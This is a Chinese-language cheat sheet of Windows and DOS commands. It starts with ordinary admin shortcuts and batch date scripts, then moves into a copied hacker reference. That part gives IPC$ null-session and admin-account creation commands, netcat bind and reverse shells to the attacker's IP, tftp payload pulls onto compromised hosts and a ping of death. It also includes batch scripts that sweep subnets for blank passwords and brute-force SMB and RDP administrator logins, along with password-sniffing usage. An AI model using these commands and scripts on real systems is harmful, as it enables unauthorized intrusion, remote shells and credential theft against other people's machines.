# 通用

## Windows打开定时任务

```cmd
win+R cmd
taskschd.msc
```

## IE重置

```cmd
win+R 输入 inetcpl.cpl
```

## 批量修改文件名

```cmd
dir /b>rename.txt
ren 
```

## 快速进入win服务窗口

```cmd
win+R 输入services.msc
```

## 远程桌面快捷方式

```cmd
win+R	mstsc
```



## 应用中的windows常用MSC命令

```cmd
azman.msc--授权管理器
admgmt.msc--ad管理
calc-----------启动计算器
certmgr.msc--证书－当前用户
certtmpl.msc--证书模板
chkdsk.exe-----Chkdsk磁盘检查
charmap--------启动字符映射表
ciadv.msc--索引服务
cliconfg-------SQL SERVER 客户端网络实用程序
clipbrd--------剪贴簿查看器
cleanmgr-------垃圾整理
cmd.exe--------CMD命令提示符
compmgmt.msc---计算机管理
conf-----------启动netmeeting
cys--配置您的服务器
dcomcnfg.exe--组件服务
dcpol.msc--域控制器策略
ddeshare-------打开DDE共享设置
debug--dos命令
devmgmt.msc--- 设备管理器
dfrg.msc-------磁盘碎片整理程序
dhcpmgmt.msc--dhcp设置
diskmgmt.msc---磁盘管理实用程序
dnsmgmt.msc--dns设置
domain.msc--域和信任关系
dompol.msc--域安全策略
drwtsn32------ 系统医生
dsa.msc--ad用户和计算机
dssite.msc--ad站点和计算机
dvdplay--------DVD播放器
dxdiag---------检查DirectX信息
eventvwr-------事件查看器
eventvwr.msc--事件查看器
explorer-------打开资源管理器
eudcedit-------造字程序
filesvr.msc--文件服务器管理
fsmgmt.msc--共享文件夹)
fsmgmt.msc-----共享文件夹管理器
gpedit.msc-----组策略
ias.msc--internet验证服务
iexpress-------木马捆绑工具，系统自带
iis.msc--信息管理器
inetmgr---internet信息服务(IIS)(IIS组件已安好了)
logoff---------注销命令
ipaddrmgmt.msc--ip地址管理
ipconfig---查看设置信息
lusrmgr.msc----本机用户和组
magnify--------放大镜实用程序
mem.exe--------显示内存使用情况
mmc------------打开控制台
mplayer2-------简易widnows media player
msconfig.exe---系统配置实用程序
msinfo32--查看系统信息(系统摘要) 若运行不了,看"服务"中的帮助服务是否开启
mstsc.msc--远程桌面
mspaint--------画图板
mobsync--------同步命令
mstsc----------远程桌面连接
narrator-------屏幕“讲述人”
notepad--------打开记事本
nslookup-------用来诊断域名系统 (DNS) 基础结构的信息
ntbackup-------系统备份和还原
ntmsmgr.msc----移动存储管理器
ntmsoprq.msc---移动存储管理员操作请求
netstat –ano----(TC)命令检查接口
netsh--(dos命令对网络的配置)
net stop messenger-----停止信使服务
net start messenger----开始信使服务
osk------------打开屏幕键盘
odbcad32-------ODBC数据源管理器
oobe/msoobe /a----检查XP是否激活
packager-------对象包装程序
perfmon.msc----计算机性能监测程序
pkmgmt.msc--(公匙管理)
progman--------程序管理器
rsadmin.msc--远程存储
rsop.msc-------组策略结果集
regedit.exe----注册表
regedt32.exe-------注册表编辑器
runonce -p ----15秒关机
regsvr32 /u *.dll----停止dll文件运行 regsvr32 /u
zipfldr.dll------取消ZIP支持
scandisk(外)--检测,修复磁盘命令
schmmgmt.msc--ad架构
secpol.msc-----本地安全策略
services.msc---本地服务设置
shrpubw--------创建共享文件夹 sigverif-------文件签名验证程序
sndrec32-------录音机
sndvol32-------音量控制程序
sfc.exe--------系统文件检查器
sfc /scannow-----扫描错误并复原
systeminfo--显示系统信息
syncapp--------创建一个公文包
sysedit--------系统配置编辑器
syskey-------系统加密,一旦加密就不能解开,保护windows xp系统的双重密码
taskmgr--------任务管理器
tasklist--查看系统进程
tscc.msc---终端服务配置
tsshutdn-------60秒倒计时关机命令
tourstart------xp简介（安装完成后出现的漫游xp程序） utilman 或 windows键+u --------辅助工具管理器
wiaacmgr-------扫描仪和照相机向导
winchat--------2000以上自带局域网聊天
winmsd---------系统信息
wins.msc--wins服务器配置
winver---------检查Windows版本
wmimgmt.msc----打开windows管理体系结构(WMI)
write----------写字板
wscript--------windows脚本宿主设置
wupdmgr--------windows更新程序
```



# DOS

## 看windows环境变量

```cmd
echo %path%
```

## 看端口进程

```cmd
netstat -aon|findstr "8080"
```

## 查看Pid 是什么进程

```cmd
tasklist | findstr "22244"
```

## 检查网络

```cmd
ping www.baidu.com -t
tracert -d www.baidu.com
```

## 显示目录结构

```cmd
tree /F  #显示目录结构
```

## dos获取当天是星期几

```cmd
@echo off
for /f "tokens=1,2" %%a in ('date /t') do @echo %%b 
echo %date:~11,14%
echo %date:~-2%
```

## dos下获取系统前一天的日期

from: https://bbs.csdn.net/topics/310231544

```cmd
@echo off
rem 计算指定天数之前的日期
set DaysAgo=1
rem 假设系统日期的格式为yyyy-mm-dd
call :DateToDays %date:~0,4% %date:~5,2% %date:~8,2% PassDays
set /a PassDays-=%DaysAgo%
call :DaysToDate %PassDays% DstYear DstMonth DstDay
set DstDate=%DstYear%-%DstMonth%-%DstDay%
echo %DaysAgo%天的日期是%DstDate%
set lastDay=%DstDate:~0,4%%DstDate:~5,2%%DstDate:~8,2%
echo %lastDay%
pause

goto :eof

:DateToDays %yy% %mm% %dd% days
setlocal ENABLEEXTENSIONS
set yy=%1&set mm=%2&set dd=%3
if 1%yy% LSS 200 if 1%yy% LSS 170 (set yy=20%yy%) else (set yy=19%yy%)
set /a dd=100%dd%%%100,mm=100%mm%%%100
set /a z=14-mm,z/=12,y=yy+4800-z,m=mm+12*z-3,j=153*m+2
set /a j=j/5+dd+y*365+y/4-y/100+y/400-2472633
endlocal&set %4=%j%&goto :EOF

:DaysToDate %days% yy mm dd
setlocal ENABLEEXTENSIONS
set /a a=%1+2472632,b=4*a+3,b/=146097,c=-b*146097,c/=4,c+=a
set /a d=4*c+3,d/=1461,e=-1461*d,e/=4,e+=c,m=5*e+2,m/=153,dd=153*m+2,dd/=5
set /a dd=-dd+e+1,mm=-m/10,mm*=12,mm+=m+3,yy=b*100+d-4800+m/10
(if %mm% LSS 10 set mm=0%mm%)&(if %dd% LSS 10 set dd=0%dd%)
endlocal&set %2=%yy%&set %3=%mm%&set %4=%dd%&goto :EOF
```

## dos下看进程，杀进程

```cmd
在DOS 下输入 
tasklist /m eclipse* 查看eclipse所占用进程，得到pid 
taskkill /pid 117464 /F  强行杀掉该进程 
```

dos命令大全

from: http://www.cnblogs.com/cpcpc/archive/2010/07/16/2123113.html

```cmd
见到网络上,觉得值得学习,特此收藏到这里
net use //ip/ipc$ " " /user:" " 建立IPC空链接 
net use //ip/ipc$ "密码" /user:"用户名" 建立IPC非空链接 
net use h: //ip/c$ "密码" /user:"用户名" 直接登陆后映射对方C：到本地为H: 
net use h: //ip/c$ 登陆后映射对方C：到本地为H: 
net use //ip/ipc$ /del 删除IPC链接 
net use h: /del 删除映射对方到本地的为H:的映射 
net user 用户名　密码　/add 建立用户 
net user guest /active:yes 激活guest用户 
net user 查看有哪些用户 
net user 帐户名 查看帐户的属性 
net localgroup administrators 用户名 /add 把"用户"添加到管理员中使其具有管理员权限,注意：administrator后加s用复数 
net start 查看开启了哪些服务 
net start 服务名　 开启服务；(如:net start telnet， net start schedule) 
net stop 服务名 停止某服务 
net time //目标ip 查看对方时间 
net time //目标ip /set 设置本地计算机时间与"目标IP"主机的时间同步,加上参数/yes可取消确认信息 
net view 查看本地局域网内开启了哪些共享 
net view //ip 查看对方局域网内开启了哪些共享 
net config 显示系统网络设置 
net logoff 断开连接的共享 
net pause 服务名 暂停某服务 
net send ip "文本信息" 向对方发信息 
net ver 局域网内正在使用的网络连接类型和信息 
net share 查看本地开启的共享 
net share ipc$ 开启ipc$共享 
net share ipc$ /del 删除ipc$共享 
net share c$ /del 删除C：共享 
net user guest 12345 用guest用户登陆后用将密码改为12345 
net password 密码 更改系统登陆密码 
netstat -a 查看开启了哪些端口,常用netstat -an 
netstat -n 查看端口的网络连接情况，常用netstat -an 
netstat -v 查看正在进行的工作 
netstat -p 协议名 例：netstat -p tcq/ip 查看某协议使用情况（查看tcp/ip协议使用情况） 
netstat -s 查看正在使用的所有协议使用情况 
nbtstat -A ip 对方136到139其中一个端口开了的话，就可查看对方最近登陆的用户名（03前的为用户名）-注意：参数-A要大写 
tracert -参数 ip(或计算机名) 跟踪路由（数据包），参数："-w数字"用于设置超时间隔。 
ping ip(或域名) 向对方主机发送默认大小为32字节的数据，参数："-l[空格]数据包大小"；"-n发送数据次数"；"-t"指一直ping。 
ping -t -l 65550 ip 死亡之ping(发送大于64K的文件并一直ping就成了死亡之ping) 
ipconfig (winipcfg) 用于windows NT及XP(windows 95 98)查看本地ip地址，ipconfig可用参数"/all"显示全部配置信息 
tlist -t 以树行列表显示进程(为系统的附加工具，默认是没有安装的，在安装目录的Support/tools文件夹内) 
kill -F 进程名 加-F参数后强制结束某进程(为系统的附加工具，默认是没有安装的，在安装目录的Support/tools文件夹内) 
del -F 文件名 加-F参数后就可删除只读文件,/AR、/AH、/AS、/AA分别表示删除只读、隐藏、系统、存档文件，/A-R、/A-H、/A-S、/A-A表示删 除除只读、隐藏、系统、存档以外的文件。例如"DEL/AR *.*"表示删除当前目录下所有只读文件，"DEL/A-S *.*"表示删除当前目录下除系统文件以外的所有文件 


#2 二： 


del /S /Q 目录 或用：rmdir /s /Q 目录 /S删除目录及目录下的所有子目录和文件。同时使用参数/Q 可取消删除操作时的系统确认就直接删除。（二个命令作用相同） 
move 盘符/路径/要移动的文件名　存放移动文件的路径/移动后文件名 移动文件,用参数/y将取消确认移动目录存在相同文件的提示就直接覆盖 
fc one.txt two.txt > 3st.txt 对比二个文件并把不同之处输出到3st.txt文件中，"> "和"> >" 是重定向命令 
at id号 开启已注册的某个计划任务 
at /delete 停止所有计划任务，用参数/yes则不需要确认就直接停止 
at id号 /delete 停止某个已注册的计划任务 
at 查看所有的计划任务 
at //ip time 程序名(或一个命令) /r 在某时间运行对方某程序并重新启动计算机 
finger username @host 查看最近有哪些用户登陆 
telnet ip 端口 远和登陆服务器,默认端口为23 
open ip 连接到IP（属telnet登陆后的命令） 
telnet 在本机上直接键入telnet 将进入本机的telnet 
copy 路径/文件名1　路径/文件名2 /y 复制文件1到指定的目录为文件2，用参数/y就同时取消确认你要改写一份现存目录文件 
copy c:/srv.exe //ip/admin$ 复制本地c:/srv.exe到对方的admin下 
cppy 1st.jpg/b+2st.txt/a 3st.jpg 将2st.txt的内容藏身到1st.jpg中生成3st.jpg新的文件，注：2st.txt文件头要空三排，参数：/b指二进制文件，/a指 ASCLL格式文件 
copy //ip/admin$/svv.exe c:/ 或:copy//ip/admin$/*.* 复制对方admini$共享下的srv.exe文件（所有文件）至本地C： 
xcopy 要复制的文件或目录树　目标地址/目录名 复制文件和目录树，用参数/Y将不提示覆盖相同文件 
tftp -i 自己IP(用肉机作跳板时这用肉机IP) get server.exe c:/server.exe 登陆后，将"IP"的server.exe下载到目标主机c:/server.exe 参数：-i指以二进制模式传送，如传送exe文件时用，如不加-i 则以ASCII模式（传送文本文件模式）进行传送 
tftp -i 对方IP　put c:/server.exe 登陆后，上传本地c:/server.exe至主机 
ftp ip 端口 用于上传文件至服务器或进行文件操作，默认端口为21。bin指用二进制方式传送（可执行文件进）；默认为ASCII格式传送(文本文件时) 
route print 显示出IP路由，将主要显示网络地址Network addres，子网掩码Netmask，网关地址Gateway addres，接口地址Interface 
arp 查看和处理ARP缓存，ARP是名字解析的意思，负责把一个IP解析成一个物理性的MAC地址。arp -a将显示出全部信息 
start 程序名或命令 /max 或/min 新开一个新窗口并最大化（最小化）运行某程序或命令 
mem 查看cpu使用情况 
attrib 文件名(目录名) 查看某文件（目录）的属性 
attrib 文件名 -A -R -S -H 或 +A +R +S +H 去掉(添加)某文件的 存档，只读，系统，隐藏 属性；用＋则是添加为某属性 
dir 查看文件，参数：/Q显示文件及目录属系统哪个用户，/T:C显示文件创建时间，/T:A显示文件上次被访问时间，/T:W上次被修改时间 
date /t 、 time /t 使用此参数即"DATE/T"、"TIME/T"将只显示当前日期和时间，而不必输入新日期和时间 
set 指定环境变量名称=要指派给变量的字符 设置环境变量 
set 显示当前所有的环境变量 
set p(或其它字符) 显示出当前以字符p(或其它字符)开头的所有环境变量 
pause 暂停批处理程序，并显示出：请按任意键继续.... 
if 在批处理程序中执行条件处理（更多说明见if命令及变量） 
goto 标签 将cmd.exe导向到批处理程序中带标签的行（标签必须单独一行，且以冒号打头，例如："：start"标签） 
call 路径/批处理文件名 从批处理程序中调用另一个批处理程序 （更多说明见call /?） 
for 对一组文件中的每一个文件执行某个特定命令（更多说明见for命令及变量） 
echo on或off 打开或关闭echo，仅用echo不加参数则显示当前echo设置 
echo 信息 在屏幕上显示出信息 
echo 信息 >> pass.txt 将"信息"保存到pass.txt文件中 
findstr "Hello" aa.txt 在aa.txt文件中寻找字符串hello 
find 文件名 查找某文件 
title 标题名字 更改CMD窗口标题名字 
color 颜色值 设置cmd控制台前景和背景颜色；0＝黑、1＝蓝、2＝绿、3＝浅绿、4＝红、5＝紫、6＝黄、7=白、8=灰、9=淡蓝、A＝淡绿、B=淡浅绿、C=淡 红、D=淡紫、E=淡黄、F=亮白 
prompt 名称 更改cmd.exe的显示的命令提示符(把C:/、D:/统一改为：EntSky/ ) 


#3 三： 


ver 在DOS窗口下显示版本信息 
winver 弹出一个窗口显示版本信息（内存大小、系统版本、补丁版本、计算机名） 
format 盘符 /FS:类型 格式化磁盘,类型:FAT、FAT32、NTFS ,例：Format D: /FS:NTFS 
md　目录名 创建目录 
replace 源文件　要替换文件的目录 替换文件 
ren 原文件名　新文件名 重命名文件名 
tree 以树形结构显示出目录，用参数-f 将列出第个文件夹中文件名称 
type 文件名 显示文本文件的内容 
more 文件名 逐屏显示输出文件 
doskey 要锁定的命令＝字符 
doskey 要解锁命令= 为DOS提供的锁定命令(编辑命令行，重新调用win2k命令，并创建宏)。如：锁定dir命令：doskey dir=entsky (不能用doskey dir=dir)；解锁：doskey dir= 
taskmgr 调出任务管理器 
chkdsk /F D: 检查磁盘D并显示状态报告；加参数/f并修复磁盘上的错误 
tlntadmn telnt服务admn,键入tlntadmn选择3，再选择8,就可以更改telnet服务默认端口23为其它任何端口 
exit 退出cmd.exe程序或目前，用参数/B则是退出当前批处理脚本而不是cmd.exe 
path 路径/可执行文件的文件名 为可执行文件设置一个路径。 
cmd 启动一个win2K命令解释窗口。参数：/eff、/en 关闭、开启命令扩展；更我详细说明见cmd /? 
regedit /s 注册表文件名 导入注册表；参数/S指安静模式导入，无任何提示； 
regedit /e 注册表文件名 导出注册表 
cacls 文件名　参数 显示或修改文件访问控制列表（ACL）——针对NTFS格式时。参数：/D 用户名:设定拒绝某用户访问；/P 用户名:perm 替换指定用户的访问权限；/G 用户名:perm 赋予指定用户访问权限；Perm 可以是: N 无，R 读取， W 写入， C 更改(写入)，F 完全控制；例：cacls D:/test.txt /D pub 设定d:/test.txt拒绝pub用户访问。 
cacls 文件名 查看文件的访问用户权限列表 
REM 文本内容 在批处理文件中添加注解 
netsh 查看或更改本地网络配置情况 


#4 四： 


IIS服务命令： 
iisreset /reboot 重启win2k计算机（但有提示系统将重启信息出现） 
iisreset /start或stop 启动（停止）所有Internet服务 
iisreset /restart 停止然后重新启动所有Internet服务 
iisreset /status 显示所有Internet服务状态 
iisreset /enable或disable 在本地系统上启用（禁用）Internet服务的重新启动 
iisreset /rebootonerror 当启动、停止或重新启动Internet服务时，若发生错误将重新开机 
iisreset /noforce 若无法停止Internet服务，将不会强制终止Internet服务 
iisreset /timeout Val在到达逾时间（秒）时，仍未停止Internet服务，若指定/rebootonerror参数，则电脑将会重新开机。预设值为重新启动20秒，停 止60秒，重新开机0秒。 
FTP 命令： (后面有详细说明内容) 
ftp的命令行格式为: 
ftp －v －d －i －n －g[主机名] －v 显示远程服务器的所有响应信息。 
－d 使用调试方式。 
－n 限制ftp的自动登录,即不使用.netrc文件。 
－g 取消全局文件名。 
help [命令] 或 ？[命令] 查看命令说明 
bye 或 quit 终止主机FTP进程,并退出FTP管理方式. 
pwd 列出当前远端主机目录 
put 或 send 本地文件名 [上传到主机上的文件名] 将本地一个文件传送至远端主机中 
get 或 recv [远程主机文件名] [下载到本地后的文件名] 从远端主机中传送至本地主机中 
mget [remote-files] 从远端主机接收一批文件至本地主机 
mput local-files 将本地主机中一批文件传送至远端主机 
dir 或 ls [remote-directory] [local-file] 列出当前远端主机目录中的文件.如果有本地文件,就将结果写至本地文件 
ascii 设定以ASCII方式传送文件(缺省值) 
bin 或 image 设定以二进制方式传送文件 
bell 每完成一次文件传送,报警提示 
cdup 返回上一级目录 
close 中断与远程服务器的ftp会话(与open对应) 
open host[port] 建立指定ftp服务器连接,可指定连接端口 
delete 删除远端主机中的文件 
mdelete [remote-files] 删除一批文件 
mkdir directory-name 在远端主机中建立目录 
rename [from] [to] 改变远端主机中的文件名 
rmdir directory-name 删除远端主机中的目录 
status 显示当前FTP的状态 
system 显示远端主机系统类型 
user user-name [password] [account] 重新以别的用户名登录远端主机 
open host [port] 重新建立一个新的连接 
prompt 交互提示模式 
macdef 定义宏命令 
lcd 改变当前本地主机的工作目录,如果缺省,就转到当前用户的HOME目录 
chmod 改变远端主机的文件权限 
case 当为ON时,用MGET命令拷贝的文件名到本地机器中,全部转换为小写字母 
cd remote－dir 进入远程主机目录 
cdup 进入远程主机目录的父目录 
! 在本地机中执行交互shell，exit回到ftp环境,如!ls＊.zip 


#5 五： 


MYSQL 命令： 
mysql -h主机地址 -u用户名 －p密码 连接MYSQL;如果刚安装好MYSQL，超级用户root是没有密码的。 
（例：mysql -h110.110.110.110 -Uroot -P123456 
注:u与root可以不用加空格，其它也一样） 
exit 退出MYSQL 
mysqladmin -u用户名 -p旧密码 password 新密码 修改密码 
grant select on 数据库.* to 用户名@登录主机 identified by /"密码/"; 增加新用户。（注意：和上面不同，下面的因为是MYSQL环境中的命令，所以后面都带一个分号作为命令结束符） 
show databases; 显示数据库列表。刚开始时才两个数据库：mysql和test。mysql库很重要它里面有MYSQL的系统信息，我们改密码和新增用户，实际上就是用这 个库进行操作。 
use mysql； 
show tables; 显示库中的数据表 
describe 表名; 显示数据表的结构 
create database 库名; 建库 
use 库名； 
create table 表名 (字段设定列表)； 建表 
drop database 库名; 
drop table 表名； 删库和删表 
delete from 表名; 将表中记录清空 
select * from 表名; 显示表中的记录 
mysqldump --opt school>school.bbb 备份数据库：（命令在DOS的//mysql//bin目录下执行）;注释:将数据库school备份到school.bbb文件，school.bbb 是一个文本文件，文件名任取，打开看看你会有新发现。 
win2003系统下新增命令（实用部份）： 
shutdown /参数 关闭或重启本地或远程主机。 
参数说明：/S 关闭主机，/R 重启主机， /T 数字 设定延时的时间，范围0～180秒之间， /A取消开机，/M //IP 指定的远程主机。 
例：shutdown /r /t 0 立即重启本地主机（无延时） 
taskill /参数 进程名或进程的pid 终止一个或多个任务和进程。 
参数说明：/PID 要终止进程的pid,可用tasklist命令获得各进程的pid，/IM 要终止的进程的进程名，/F 强制终止进程，/T 终止指定的进程及他所启动的子进程。 
tasklist 显示当前运行在本地和远程主机上的进程、服务、服务各进程的进程标识符(PID)。 
参数说明：/M 列出当前进程加载的dll文件，/SVC 显示出每个进程对应的服务，无参数时就只列出当前的进程。 


#6 六： 


Linux系统下基本命令： 要区分大小写 
uname 显示版本信息（同win2K的 ver） 
dir 显示当前目录文件,ls -al 显示包括隐藏文件（同win2K的 dir） 
pwd 查询当前所在的目录位置 
cd cd　..回到上一层目录，注意cd 与..之间有空格。cd　/返回到根目录。 
cat 文件名 查看文件内容 
cat >abc.txt 往abc.txt文件中写上内容。 
more 文件名 以一页一页的方式显示一个文本文件。 
cp 复制文件 
mv 移动文件 
rm 文件名 删除文件，rm -a 目录名删除目录及子目录 
mkdir 目录名 建立目录 
rmdir 删除子目录，目录内没有文档。 
chmod 设定档案或目录的存取权限 
grep 在档案中查找字符串 
diff 档案文件比较 
find 档案搜寻 
date 现在的日期、时间 
who 查询目前和你使用同一台机器的人以及Login时间地点 
w 查询目前上机者的详细资料 
whoami 查看自己的帐号名称 
groups 查看某人的Group 
passwd 更改密码 
history 查看自己下过的命令 
ps 显示进程状态 
kill 停止某进程 
gcc 黑客通常用它来编译C语言写的文件 
su 权限转换为指定使用者 
telnet IP telnet连接对方主机（同win2K），当出现bash$时就说明连接成功。 
ftp ftp连接上某服务器（同win2K） 


附：批处理命令与变量 


1：for命令及变量 基本格式： 
FOR /参数 %variable IN (set) DO command [command_parameters] %variable:指定一个单一字母可替换的参数，如：%i ，而指定一个变量则用：%%i ，而调用变量时用：%i% ，变量是区分大小写的（%i 不等于 %I）。 
批处理每次能处理的变量从%0—%9共10个，其中%0默认给批处理文件名使用，%1默认为使用此批处理时输入的的第一个值，同理：%2—%9指 输入的第2-9个值；例：net use //ip/ipc$ pass /user:user 中ip为%1,pass为%2 ,user为%3 


(set):指定一个或一组文件，可使用通配符，如：(D:/user.txt)和(1 1 254)(1 -1 254),{ "(1 1 254)"第一个"1"指起始值，第二个"1"指增长量，第三个"254"指结束值，即：从1到254；"(1 -1 254)"说明：即从254到1 } 


command：指定对第个文件执行的命令，如：net use命令；如要执行多个命令时，命令这间加：& 来隔开 
command_parameters：为特定命令指定参数或命令行开关 


IN (set)：指在(set)中取值；DO command ：指执行command 


参数：/L 指用增量形式{ (set)为增量形式时 }；/F 指从文件中不断取值，直到取完为止{ (set)为文件时，如(d:/pass.txt)时 }。 
用法举例： 
@echo off 
echo 用法格式：test.bat *.*.* > test.txt 


for /L %%G in (1 1 254) do echo %1.%%G >>test.txt & net use //%1.%%G /user:administrator | find "命令成功完成" >>test.txt 
存为test.bat 说明：对指定的一个C类网段的254个IP依次试建立administrator密码为空的IPC$连接，如果成功就把该IP存在test.txt中。 


/L指用增量形式（即从1-254或254-1）；输入的IP前面三位：*.*.*为批处理默认的 %1；%%G 为变量(ip的最后一位）；& 用来隔开echo 和net use 这二个命令；| 指建立了ipc$后，在结果中用find查看是否有"命令成功完成"信息；%1.%%G 为完整的IP地址；(1 1 254) 指起始值，增长量，结止值。 
@echo off 
echo 用法格式：ok.bat ip 
FOR /F %%i IN (D:/user.dic) DO smb.exe %1 %%i D:/pass.dic 200 
存为：ok.exe 说明：输入一个IP后，用字典文件d:/pass.dic来暴解d:/user.dic中的用户密码，直到文件中值取完为止。%%i为用户名；%1为输入 的IP地址（默认）。 


#7 七： 


2：if命令及变量 基本格式： 
IF [not] errorlevel 数字 命令语句 如果程序运行最后返回一个等于或大于指定数字的退出编码，指定条件为"真"。 
例：IF errorlevel 0 命令 指程序执行后返回的值为0时，就值行后面的命令；IF not errorlevel 1 命令指程序执行最后返回的值不等于1，就执行后面的命令。 
0 指发现并成功执行（真）；1 指没有发现、没执行（假）。 
IF [not] 字符串1==字符串2 命令语句 如果指定的文本字符串匹配（即：字符串1 等于 字符串2），就执行后面的命令。 
例："if "%2%"=="4" goto start"指：如果输入的第二个变量为4时，执行后面的命令（注意：调用变量时就%变量名%并加" "） 
IF [not] exist 文件名 命令语句 如果指定的文件名存在，就执行后面的命令。 
例："if not nc.exe goto end"指：如果没有发现nc.exe文件就跳到":end"标签处。 
IF [not] errorlevel 数字 命令语句 else 命令语句或 IF [not] 字符串1==字符串2 命令语句 else 命令语句或 IF [not] exist 文件名 命令语句 else 命令语句 加上：else 命令语句后指：当前面的条件不成立时，就指行else后面的命令。注意：else 必须与 if 在同一行才有效。 当有del命令时需把del命令全部内容用< >括起来，因为del命令要单独一行时才能执行，用上< >后就等于是单独一行了；例如："if exist test.txt. else echo test.txt.missing "，注意命令中的"." 




（二）系统外部命令(均需下载相关工具)： 


1、瑞士军刀：nc.exe 

参数说明： 
-h 查看帮助信息 
-d 后台模式 
-e prog程序重定向，一但连接就执行［危险］ 
-i secs延时的间隔 
-l 监听模式，用于入站连接 
-L 监听模式，连接天闭后仍然继续监听，直到CTR+C 
-n IP地址，不能用域名 
-o film记录16进制的传输 
-p[空格]端口 本地端口号 
-r 随机本地及远程端口 
-t 使用Telnet交互方式 
-u UDP模式 
-v 详细输出，用-vv将更详细 
-w数字 timeout延时间隔 
-z 将输入，输出关掉（用于扫锚时） 
基本用法： 
nc -nvv 192.168.0.1 80 连接到192.168.0.1主机的80端口 
nc -l -p 80 开启本机的TCP 80端口并监听 
nc -nvv -w2 -z 192.168.0.1 80-1024 扫锚192.168.0.1的80-1024端口 
nc -l -p 5354 -t -e c:winntsystem32cmd.exe 绑定remote主机的cmdshell在remote的TCP 5354端口 
nc -t -e c:winntsystem32cmd.exe 192.168.0.2 5354 梆定remote主机的cmdshell并反向连接192.168.0.2的5354端口 
高级用法： 
nc -L -p 80 作为蜜罐用1：开启并不停地监听80端口，直到CTR+C为止 
nc -L -p 80 > c:/log.txt 作为蜜罐用2：开启并不停地监听80端口，直到CTR+C,同时把结果输出到c:/log.txt 
nc -L -p 80 < c:/honeyport.txt 作为蜜罐用3-1：开启并不停地监听80端口，直到CTR+C,并把c:/honeyport.txt中内容送入管道中，亦可起到传送文件作用 
type.exe c:/honeyport | nc -L -p 80 作为蜜罐用3-2：开启并不停地监听80端口，直到CTR+C,并把c:/honeyport.txt中内容送入管道中,亦可起到传送文件作用 
本机上用：nc -l -p 本机端口 
在对方主机上用：nc -e cmd.exe 本机IP -p 本机端口 *win2K 
nc -e /bin/sh 本机IP -p 本机端口 *linux,unix 反向连接突破对方主机的防火墙 
本机上用：nc -d -l -p 本机端口 < 要传送的文件路径及名称 
在对方主机上用：nc -vv 本机IP 本机端口 > 存放文件的路径及名称 传送文件到对方主机 
备 注： 
| 管道命令 
< 或 > 重定向命令。"<"，例如：tlntadmn < test.txt 指把test.txt的内容赋值给tlntadmn命令 
＠ 表示执行＠后面的命令，但不会显示出来（后台执行）；例：＠dir c:/winnt >> d:/log.txt 意思是：后台执行dir，并把结果存在d:/log.txt中 
>与>>的区别 　">"指：覆盖；">>"指：保存到(添加到）。 
如：@dir c:/winnt >> d:/log.txt和@dir c:/winnt > d:/log.txt二个命令分别执行二次比较看：用>>的则是把二次的结果都保存了，而用：>则只有一次的结果，是因为第二次的结果 把第一次的覆盖了。 


#8 八： 
2、扫锚工具：xscan.exe 


基本格式 
xscan -host <起始IP>[-<终止IP>] <检测项目> [其他选项] 扫锚"起始IP到终止IP"段的所有主机信息 
xscan -file <主机列表文件名> <检测项目> [其他选项] 扫锚"主机IP列表文件名"中的所有主机信息 
检测项目 
-active 检测主机是否存活 
-os 检测远程操作系统类型（通过NETBIOS和SNMP协议） 
-port 检测常用服务的端口状态 
-ftp 检测FTP弱口令 
-pub 检测FTP服务匿名用户写权限 
-pop3 检测POP3-Server弱口令 
-smtp 检测SMTP-Server漏洞 
-sql 检测SQL-Server弱口令 
-smb 检测NT-Server弱口令 
-iis 检测IIS编码/解码漏洞 
-cgi 检测CGI漏洞 
-nasl 加载Nessus攻击脚本 
-all 检测以上所有项目 
其它选项 
-i 适配器编号 设置网络适配器, <适配器编号>可通过"-l"参数获取 
-l 显示所有网络适配器 
-v 显示详细扫描进度 
-p 跳过没有响应的主机 
-o 跳过没有检测到开放端口的主机 
　 -t 并发线程数量,并发主机数量 指定最大并发线程数量和并发主机数量, 默认数量为100,10 
-log 文件名 指定扫描报告文件名 (后缀为：TXT或HTML格式的文件) 
用法示例 
xscan -host 192.168.1.1-192.168.255.255 -all -active -p　 检测192.168.1.1-192.168.255.255网段内主机的所有漏洞，跳过无响应的主机 
xscan -host 192.168.1.1-192.168.255.255 -port -smb -t 150 -o 检测192.168.1.1-192.168.255.255网段内主机的标准端口状态，NT弱口令用户，最大并发线程数量为150，跳过没有检测到开放 端口的主机 
xscan -file hostlist.txt -port -cgi -t 200,5 -v -o 检测"hostlist.txt"文件中列出的所有主机的标准端口状态，CGI漏洞，最大并发线程数量为200，同一时刻最多检测5台主机，显示详细检测 进度，跳过没有检测到开放端口的主机 


#9 九： 


3、命令行方式嗅探器: xsniff.exe 
可捕获局域网内FTP/SMTP/POP3/HTTP协议密码 
参数说明 
-tcp 输出TCP数据报 
-udp 输出UDP数据报 
-icmp 输出ICMP数据报 
-pass 过滤密码信息 
-hide 后台运行 
-host 解析主机名 
-addr IP地址 过滤IP地址 
-port 端口 过滤端口 
-log 文件名 将输出保存到文件 
-asc 以ASCII形式输出 
-hex 以16进制形式输出 
用法示例 
xsniff.exe -pass -hide -log pass.log 后台运行嗅探密码并将密码信息保存在pass.log文件中 
xsniff.exe -tcp -udp -asc -addr 192.168.1.1 嗅探192.168.1.1并过滤tcp和udp信息并以ASCII格式输出 


4、终端服务密码破解: tscrack.exe 


参数说明 
-h 显示使用帮助 
-v 显示版本信息 
-s 在屏幕上打出解密能力 
-b 密码错误时发出的声音 
-t 同是发出多个连接（多线程） 
-N Prevent System Log entries on targeted server 
-U 卸载移除tscrack组件 
-f 使用－f后面的密码 
-F 间隔时间（频率） 
-l 使用－l后面的用户名 
-w 使用－w后面的密码字典 
-p 使用－p后面的密码 
-D 登录主页面 
用法示例 
tscrack 192.168.0.1 -l administrator -w pass.dic 远程用密码字典文件暴破主机的administrator的登陆密码 
tscrack 192.168.0.1 -l administrator -p 123456 用密码123456远程登陆192.168.0.1的administrator用户 
@if not exist ipcscan.txt goto noscan 
@for /f "tokens=1 delims= " %%i in (3389.txt) do call hack.bat %%i 
nscan 
@echo 3389.txt no find or scan faild 
(①存为3389.bat) （假设现有用SuperScan或其它扫锚器扫到一批开有3389的主机IP列表文件3389.txt) 
3389.bat意思是：从3389.txt文件中取一个IP，接着运行hack.bat 
@if not exist tscrack.exe goto noscan 
@tscrack %1 -l administrator -w pass.dic >>rouji.txt 
:noscan 
@echo tscrack.exe no find or scan faild 
(②存为hack.bat) (运行3389.bat就OK，且3389.bat、hack.bat、3389.txt、pass.dic与tscrack.exe在同一个目录下；就 可以等待结果了) 
hack.bat意思是：运行tscrack.exe用字典暴破3389.txt中所有主机的administrator密码，并将破解结果保存 在rouji.txt文件中。 


5、其它： 

Shutdown.exe 
